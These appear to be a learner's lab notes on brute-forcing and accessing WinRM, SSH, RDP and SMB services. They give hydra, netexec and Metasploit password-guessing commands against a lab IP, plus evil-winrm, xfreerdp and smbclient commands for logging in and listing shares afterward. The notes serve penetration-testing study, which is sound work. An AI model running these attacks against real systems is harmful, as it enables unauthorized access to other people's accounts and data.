# WinRm [[15. Windows Remote Management]]
Netexec (to crack passwords)
- Can be used for WinRM, but also other protocols like SMB, LDAP, MSSQL..
- `sudo apt-get -y install netexec`
- See general usage
	- `netexec -h`
- Protocol-specific help
	- `netexec smb -h
- General format for using
	- `netexec <protocol> <target-IP> -u <user or userlist> -p <password or passwordlist>
		- `user.list` and `password.list` for userlist and passwordlist respectively(?)

Evil-WinRM  (to connect after getting password)
- `sudo gem install evil-winrm
- `evil-winrm -i <target-IP> -u <username> -p <password>

# SSH
- Uses symmetric encryption, asymmetric encryption, hashing
- Brute force with hydra
	- `hydra -L user.list -P password.list ssh://10.129.42.197`
- `shh user@ip`

# Remote Desktop Protocol (RDP)
- Brute force with hydra 
	- `hydra -L user.list -P password.list rdp://10.129.42.197
- `xfreerdp /v:<target ip> /u:<username> /p:<password>`

# SMB
- Brute force with hydra
	- `hydra -L user.list -P password.list smb://10.129.42.197`
	- If error, saying THC Hydra cannot handle SMBv3 replies, can manually update and recompile hydra or use metasploit
- Metasploit
	- `msfconsole`
	- `use auxiliary/scanner/smb/smb_login`
	- `set user_file user.list`
	- `set pass_file password.list`
- After getting password
	- `netexec smb 10.129.42.197 -u "user" -p "password" --shares
		- to see available shares
	- `smbclient -U user \\\\10.129.42.197\\SHARENAME
		- to connect to share
